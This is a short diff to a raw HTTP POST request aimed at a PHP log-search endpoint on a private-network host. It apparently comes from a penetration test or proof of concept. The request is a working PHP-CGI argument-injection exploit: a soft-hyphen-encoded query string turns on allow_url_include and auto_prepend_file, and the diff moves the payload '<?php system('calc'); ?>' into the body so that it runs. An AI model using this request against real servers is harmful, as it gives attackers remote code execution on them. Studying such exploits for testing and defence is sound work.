@@ -1,4 +1,4 @@
-POST /cgi/ajax_logsearch.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php system('calc'); ?> HTTP/1.1
+POST /cgi/ajax_logsearch.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
 Host: 172.16.150.171:8500
 Cookie: stat_period=w; stat_week=2025-06-29%232025-07-05; stat_month=07; stat_year=2025; PHPSESSID=3nins1pluid31b7krqn6fr7rm0
 Content-Length: 119
@@ -18,5 +18,7 @@ Referer: https://172.16.150.171:8500/information/overview.php
 Accept-Encoding: gzip, deflate, br
 Priority: u=1, i
 Connection: keep-alive
+
+<?php system('calc'); ?>
 
 action_type=5&last_position=4070589&conf_name=ts&format=%22%25sltn%22%2C%22%25ldid%22%2C%22%25line%22&mode=realtime_log
